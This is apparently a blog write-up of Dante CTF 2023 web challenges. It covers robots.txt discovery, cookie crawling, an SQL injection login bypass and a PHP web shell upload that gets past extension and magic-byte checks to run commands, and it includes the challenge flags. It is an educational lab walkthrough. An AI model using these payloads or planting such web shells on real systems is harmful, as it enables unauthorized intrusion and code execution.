---
title: "Dante CTF: web challenges"
description: "An earlier set of hands-on web security challenges and their solutions."
category: Archive
date: 2023-06-05
draft: false
---

> From the archive. This article retains its original publication date; tools and recommendations reflect that period.


<p>Writeups of the Dante CTF 2023 - WEB</p>
<p> </p>
<h2 id="web">WEB</h2>
<h2 id="unknown-site-1">Unknown Site 1</h2>
<p>🏆 Challenge Description</p>
<p><em>Just a web warmup challenge to keep the bots away. Enjoy it.</em></p>
<hr/>
<p><img alt="Unknown site main page" src="/images/site1.png"/></p>
<p>The page shows an image. The image refers to Google and shows a robot as a hint. Robots file is very important for a search engine. It is a file located on a server which indicates which file the search engine can show on the internet and can access to in order to crawl and collect info about the website.</p>
<p>🏁 <!-- raw HTML omitted -->DANTE{Yo0_Must_B3_A_R0boTtTtTtTTtTAD6182_0991847}<!-- raw HTML omitted --></p>
<p> </p>
<p> </p>
<h2 id="unknown-site-2">Unknown Site 2</h2>
<p>🏆 Challenge Description</p>
<p><em>Now that you completed the Warmup, you need to get the hidden second flag on the same site.</em></p>
<hr/>
<p>After completing the challenge above, <strong>Unknown Site 1</strong>, we can see some more info in the file <code>robots.txt</code>:</p>
<ul>
<li>The first flag</li>
<li>Some other directories</li>
</ul>
<p>Visiting the first directory (<code>s3cretDirectory1</code>) gives us the following result:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">Hello There User!
</code></pre></div>

<p>Poking around with headers we can find a cookie named <code>FLAG</code> with value <code>NOPE</code>. Trying to access <code>s3cretDirectory2</code> gives us a similar result. Visiting <code>s3cretDirectory3</code> instead, returns a list of <code>php</code> pages saved in that directory.</p>
<p>Example:</p>
<pre tabindex="0"><code>0aI4CRUqFVn5vTWQsoNZhFvKcGg7i6e3.php
0akStEOWq118z6EroRWoLIdAJ2gRntAa.php
0BmZPSmQaQ4AoYsKhDdH3U5B47dRQKqf.php
0BRUlCClTlqglOMCcfI8ehGd5u2dY8x8.php
0D33rdk9NREOX1raB4AJLyQicNqhROI7.php
0gUxhSv85tdnmcjbjxMkotMUE3Eq8s3h.php
00i8HTSHh9okcnuoIrIxErhAjSe1gKQa.php
0IUOyATG24VDSpHI9PNxQGJrz8iqaINl.php
0Jc7BSRx6Is10vu0oCrjn9D99kfM6MjI.php
</code></pre><p>Clicking on pages, you will get always the same result:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">Hello There User!
</code></pre></div>

<p>And the cookie with name <code>FLAG</code> value <code>NOPE</code> is still present. The solution is to write a small script to crawl all the <code>PHP</code> files and check all the <code>FLAG</code> cookies in order to get the flag.</p>
<div class="highlight"><pre tabindex="0"><code class="language-python" data-lang="python"><span>import</span> requests <span>as</span> r
<span>from</span> bs4 <span>import</span> BeautifulSoup
<span>import</span> re

response <span>=</span> r<span>.</span>get(<span>'http://localhost:5757/s3cretDirectory3/'</span>)
soup <span>=</span> BeautifulSoup(response<span>.</span>text, features<span>=</span><span>"html.parser"</span>)

<span>for</span> a <span>in</span> soup<span>.</span>find_all(<span>'a'</span>, href<span>=</span><span>True</span>):
    <span>if</span> re<span>.</span>match(<span>"[a-zA-Z0-9]</span><span>{32}</span><span>"</span>, a[<span>'href'</span>]):
        request2 <span>=</span> r<span>.</span>get(<span>'http://localhost:5757/s3cretDirectory3/'</span> <span>+</span> a[<span>'href'</span>])
        <span>if</span> a[<span>'href'</span>] <span>!=</span> <span>"index.php"</span> <span>and</span> request2<span>.</span>cookies<span>.</span>get_dict()[<span>'FLAG'</span>] <span>!=</span> <span>"NOPE"</span>:
            print(<span>"Found flag in page: "</span> <span>+</span> a[<span>'href'</span>])
            print(request2<span>.</span>cookies<span>.</span>get_dict())
            <span>break</span>
</code></pre></div>

<p>🏁 <!-- raw HTML omitted -->DANTE{Rand0m_R3al_C00ki3_000912_24}<!-- raw HTML omitted --></p>
<p> </p>
<p> </p>
<h2 id="dante-barber-shop">Dante Barber Shop</h2>
<p>🏆 Challenge Description</p>
<p>Welcome to our renowned barber shop!
Your task, should you choose to accept it, is to uncover hidden information and retrieve the sensitive data that the owners may have left around.</p>
<hr/>
<!-- raw HTML omitted -->
<p>To begin, you’ll need to navigate through the website and explore the various pages. Pay close attention to the details provided, as they may contain clues or hidden information. In particular, the challenge hints that the credentials can be found in the <code>barber1.jpg</code> image.</p>
<!-- raw HTML omitted -->
<p>Once you’ve successfully discovered the credentials hidden within the <code>barber1.jpg</code> image, you can proceed to the login page. Use the obtained username and password to log in as a barber user. You will be granted access to the admin page, where you can perform further actions.</p>
<!-- raw HTML omitted -->
<p> </p>
<p> </p>
<h2 id="dumb-admin">Dumb Admin</h2>
<p>🏆 Challenge Description</p>
<p>The Admin coded his dashboard by himself. He’s sure to be a pro coder and he’s so satisfied about it. Can you make him rethink that?</p>
<hr/>
<p><img alt="Dumb Admin main page" src="/images/login.png"/></p>
<p>We’re prompted on an admin panel login. The first thing you should try on an input is to attempt a SQL Injection especially on Admin panels because the first row in the database will most probably be the row which contains admin info such as username, password … For now we can try to access by typing something random:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">username: admin
password: admin
</code></pre></div>

<p>What we get from the page is: <code>Invalid password format</code>. So for some reason we need to put a more secure password in the login too, we will proceed by using as password <code>Som3PasswoRd3%</code>.</p>
<p>Trying:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">username: admin
password: Som3PasswoRd3%
</code></pre></div>

<p>we get <code>Username or password wrong</code>.</p>
<p>So let’s try to inject something like <code>'</code> in the username to interrupt an SQL Syntax of a query.</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">username: '
password: Som3PasswoRd3%
</code></pre></div>

<p>What we get is a strange error:</p>
<div class="highlight"><pre tabindex="0"><code class="language-php" data-lang="php"><span>SQLite3</span><span>::</span><span>query</span>()<span>:</span> <span>Unable</span> <span>to</span> <span>prepare</span> <span>statement</span><span>:</span> <span>1</span><span>:</span> <span>near</span> <span>"' AND password = '"</span><span>:</span> <span>syntax</span> <span>error</span>
</code></pre></div>

<p>This seems to be a classical error for a SQL injection.</p>
<p>If instead we try to inject a good query adding a comment too:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">username: ' -- comment
password: Som3PasswoRd3%
</code></pre></div>

<p>This time we get again Username or password wrong.
We can try to inject the most basic kind of SQL injection known which is ' or 1=1 – comment (Logic SQL injection) to let the backend retrieve the administrator’s row since admin is often the first registered user in a database.</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">username: ' or 1=1 -- comment
password: Som3PasswoRd3%
</code></pre></div>

<p><img alt="Admin dashboard" src="/images/admin.png"/></p>
<p>The page allows us to upload an image. The first thing to do is to please the form and upload an image within (2 KB).
Take a small screenshot of something of a few bytes and try to upload it.</p>
<p>What we got is a generated hash with my file extension:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">The image 7b44dc6bbcfb8d457453656ae33181d7.png has been uploaded!
You can view it here: Click here
</code></pre></div>

<p>Clicking the link we can see the image:</p>
<p><img alt="Image upload" src="/images/image.png"/></p>
<p>By clicking it, we can see the image rendered by the browser since we’re accessing it directly.</p>
<p>So this must be a way to execute something that we can upload with the previous image form.</p>
<p>Since we’re working with PHP (you can clearly see it from link extensions, for example: dashboard.php), we can build a PHP script to execute some code on the remote server:</p>
<div class="highlight"><pre tabindex="0"><code class="language-php" data-lang="php"><span>&lt;?</span><span>php</span> <span>system</span>($_GET[<span>'cmd'</span>]); <span>?&gt;</span><span>
</span></code></pre></div>

<p>and we save it in a file called shell.php.</p>
<p>Let’s try to upload it.</p>
<p>An error occurs:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">The extension '.php' indicate it is not an image!
</code></pre></div>

<p>There is a check on the file extension.
The most basic bypass for an extension is to add a fake extension and appending .php extension anyway. You can find some payloads here: <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a>.</p>
<p>Let’s try to modify the name of the file from shell.php to shell.png.php.
It seems to work, since we get a different error from the page:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">Uploaded file seems to be not a real image!
</code></pre></div>

<p>After a bit of research, you can notice a strange response header that is set:</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">Magic-Function-Used-By-The-Page: exif_imagetype
</code></pre></div>

<p>This is a tip about what backend is running. Let’s take a look at what exif_imagetype is. From the PHP manual <a href="https://www.php.net/manual/en/function.exif-imagetype.php">https://www.php.net/manual/en/function.exif-imagetype.php</a>, we can get some info.<br/>
<code>exif_imagetype() reads the first bytes of an image and checks its signature.</code></p>
<p>So if such a built-in function is used, we can easily bypass it by adding some Magic bytes at the beginning of our file shell.png.php. Of course, we will still try to inject PHP code to achieve an RCE.
To do so, we can build a simple python script that does the work:</p>
<div class="highlight"><pre tabindex="0"><code class="language-python" data-lang="python">outputFile <span>=</span> <span>"shell.png.php"</span>

shell <span>=</span> <span>b</span><span>"&lt;?php system($_GET['cmd']); ?&gt;"</span>

<span>with</span> open(outputFile,<span>"wb"</span>) <span>as</span> f:
    f<span>.</span>write(<span>b</span><span>"</span><span>\xff</span><span>"</span>)
    f<span>.</span>write(<span>b</span><span>"</span><span>\xd8</span><span>"</span>)
    f<span>.</span>write(<span>b</span><span>"</span><span>\xff</span><span>"</span>)
    f<span>.</span>write(<span>b</span><span>"</span><span>\xee</span><span>"</span>)
    f<span>.</span>write(shell)

print(<span>"Content of the exported file: "</span>)

lines <span>=</span> []
<span>with</span> open(outputFile,<span>"rb"</span>) <span>as</span> f:
    lines <span>=</span> f<span>.</span>readlines()

print(lines)

</code></pre></div>

<p>ffd8ffee are the first bytes in a jpg image. Now finally we can try to upload the file again.</p>
<p>And here we go!</p>
<div class="highlight"><pre tabindex="0"><code class="language-plaintext" data-lang="plaintext">The image 826eca1e5af937d67e30584b422f8d12.png.php has been uploaded!
You can view it here: Click here

</code></pre></div>

<p>Clicking the link, we can do the same thing as before and access the direct link of the uploaded PHP file.
In my case, it is urlbefore…/f9bbbecb61014db8f0674bf60c27e668/826eca1e5af937d67e30584b422f8d12.png.php.</p>
<p>Now we can finally get the flag by requesting the page with a GET parameter set as cmd, to retrieve the flag executing a cat.</p>
<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">.../f9bbbecb61014db8f0674bf60c27e668/826eca1e5af937d67e30584b422f8d12.png.php?cmd<span>=</span>cat+/flag.txt
</code></pre></div>

<p>🏁 <!-- raw HTML omitted -->DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}<!-- raw HTML omitted --></p>

